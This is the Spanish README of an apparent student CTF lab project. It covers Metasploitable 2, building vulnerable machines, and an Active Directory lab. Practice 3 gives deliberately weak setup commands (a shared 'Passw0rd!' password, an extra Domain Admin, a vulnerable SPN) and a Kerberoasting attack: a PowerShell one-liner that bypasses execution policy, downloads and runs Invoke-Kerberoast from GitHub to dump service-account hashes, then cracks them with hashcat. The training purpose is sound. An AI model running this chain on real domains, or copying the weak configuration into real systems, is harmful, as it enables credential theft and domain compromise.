# Desarrollo_CTF
Este commit contiene los scripts que se utilizan en las diferentes prácticas que serán desarrolladas por los alumnos.
Estos pequeños scripts van desde la configuración inicial de una máquina virtual a la creación de un Active Directory junto a su forest.

# Práctica 1
En la práctica 1, sólo tendremos que descargarnos "Metasploitable 2" de la página oficial de Rapid7 (https://docs.rapid7.com/metasploit/metasploitable-2/). Una vez descargado, simplemente realizamos doble clic en el archivo "Metasploitable.vmx" y esto automáticamente abrirá el software VMware junto con la máquina virtual ya instalada. El siguiente paso será usar "Metasploitable 2". El cómo usarlo se explica ampliamente en trabajo de fin de grado.

# Práctica 2
En esta práctica se dará una guía de cómo crear maquinas vulnerables para poder practicar con ellas. Una vez creada esta máquina, el alumno tendrá que redactar un documento explicando cual es la vulnerabilidad o vulnerabilidades que ha elegido para montar la máquina. Los recursos donde encontrar vulnerabilidades pueden ser los siguientes enlaces:
-	[Exploit-db](https://www.exploit-db.com/): aquí podemos descubrir hallazgos de carácter público llevados a cabo por investigadores acerca de varios tipos de software de código abierto utilizando diferentes tipos de técnicas.
-	[HackTricks](https://book.hacktricks.xyz/welcome/readme): nos encontramos ante una colección de diferentes técnicas y conceptos categorizados entre sí.
-	[VulnHub](https://github.com/vulhub/vulhub): una larga colección de imágenes Docker vulnerables que podemos usar en nuestras maquinas.
-	[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): se trata de un índice en el cual aparecen técnicas de ataque y payloads útiles categorizadas entre si (al igual que en la web de hacktricks).

Una vez encontrada esa vulnerabilidad que queremos replicar en una máquina, seguimos los pasos de creación de la máquina especificados y desarrollado ampliamente en el trabajo de fin de grado.

# Práctica 3
En esta última practica aprenderemos a configurar y montar un laboratorio de Active Directory.
En este caso necesitaremos los siguientes requisitos: 
-	Una imagen ISO de Windows server (en nuestro caso usaremos un Windows Server 2016)
-	Una imagen ISO de Windows (en nuestro caso usaremos un Windows 7)
-	Software de virtualización (en nuestro caso usaremos VirtualBox)

A la hora de configurar el servidor con Active Directory (AD) debemos de tener en cuenta los siguientes comandos; para instalar AD con powershell simplemente ejecutamos el siguiente comando:

-	_Install-windowsfeature AD-domain-services_
  
Después de esto, usamos el siguiente comando para importar el módulo de comando AD.

-	_Import-Module ADDSDeployment_

Después de importar el módulo de implementación de Active Directory, estás en posición de configurar y finalizar Active Directory.
La siguiente línea de comando de PowerShell instalará Active Directory como el primer controlador de dominio en un nuevo bosque (Forest) (esto significa que es la primera instalación de AD).
Nombramos el dominio como "server1.hacklab.local”; y nombrará el servidor como "server1" y colocará todos los registros y NTDS (donde se almacenan los valores hash de contraseñas locales) en el directorio C:\Windows.
Copia y pega el siguiente comando en PowerShell; debe ser una sola línea.

-	_Install-ADDSForest -CreateDnsDelegation:$false ` -DatabasePath "C:\Windows\NTDS" ` -DomainMode "Win2012R2" ` -DomainName "server1.hacklab.local" ` -DomainNetbiosName "server1" `  -ForestMode "Win2012R2" `  -InstallDns:$true `  -LogPath "C:\Windows\NTDS" `  -NoRebootOnCompletion:$false `  -SysvolPath "C:\Windows\SYSVOL" `  -Force:$true_
  
Seguidamente instalamos el paquete de herramientas de administración remota del servidor (RSAT), con el siguiente comando:

-	_Install-WindowsFeature RSAT-ADDS_
  
Si no queremos usar Powershell podemos hacerlo a través de CMD:

-	_dcpromo /unattend /InstallDns:yes /dnsOnNetwork:yes /replicaOrNewDomain:domain /newDomain:forest /newDomainDnsName:server1.hacklab.local /DomainNetbiosName:server1 /databasePath:"c:\Windows\ntds" /logPath:"c:\Windows\ntdslogs" /sysvolpath:"c:\Windows\sysvol" /safeModeAdminPassword:Passw0rd! /forestLevel:2 /domainLevel:2 /rebootOnCompletion:yes_
  
Ahora añadiremos un usuario al dominio por línea de comandos, esta vez a través de powershell:

-	_net user user1 Passw0rd! /ADD /DOMAIN_

Además, agregaremos ese usuario al grupo administrativo del dominio (¡Mal hecho!) con el siguiente comando:

-	_C:\Users\Administrator>net group “Domain Admins” user1 /add_

Para verificar que el usuario ha sido agregado simplemente escribimos:

-	_net users /domain_

Para verificar que el usuario haya sido agregado al grupo administrativo del dominio usamos el siguiente comando:

-	_net group /domain "Domain Admins"_

Una vez configurado todo esto, añadiremos el atacante, para ello agregaremos otro usuario, esta vez lo mantenemos como un usuario estándar, esta es la cuenta que usará para agregar la máquina VM con Windows al dominio.

-	_net user user2 Passw0rd! /ADD /DOMAIN_
  
Con esto crearemos nuestro Active Directory (AD).

Una vez creado todo, necesitamos crear una cuenta de servicio vulnerable. Para hacerlo, copiamos el siguiente comando en una ventana de CMD o PS:

-	_setspn -s http/server1.hacklab.local:80 user1_

Luego, crea un nuevo directorio (carpeta) en el escritorio y luego abre PowerShell y muévete a la ubicación del directorio en PowerShell.

-	_cd C:\Users\User2\Desktop\Hash_

Ahora estamos listo para copiar y pegar la única línea de comando a continuación en la sesión de PowerShell, el comando es el siguiente:

-	_powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/myexploit/PS_Scripts_Backup/master/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash1.txt"_

Esto realiza el ataque de kerberoast; en caso de funcionar, vemos como aparece un archivo titulado 'kerb-Hash1' en el directorio creado “C:\Users\User2\Desktop\Hash.” Abrimos este archivo de texto y vemos la cuenta de servicio devuelta con su correspondiente hash de contraseña.
Entonces, ya tenemos un hash, ¿cómo lo descifras? Tenemos la herramienta que hemos aprendido en la parte teórica, en este caso utilizaremos la herramienta Hashcat, ya que hashcat ha añadido el hash Kerberos 5 TGS-REP etype 23 a su lista de hashes compatibles (hashcat - advanced password recovery).

La sintaxis a continuación de hashcat, ejecutará un ataque de diccionario contra el hash, en un intento de descifrarlo.

-	_hashcat64.exe -m 13100 "C:\Hash1.txt" C:\Rocktastic12a --outfile="C:\OutputHash1.txt"_

Este comando suele tardar en ejecutarse, ya que los hashes Kerberos pueden tomar bastante tiempo para descifrarse; nada más acabar se creará un fichero que se llama “OutputHash1.txt.”, en el cual estará la contraseña descifrada y la cual podemos leer en texto claro.

Con esto se acabaría la práctica 3, este proceso ha sido más especificado y desarrollado de manera más amplia en el trabajo de fin de grado.
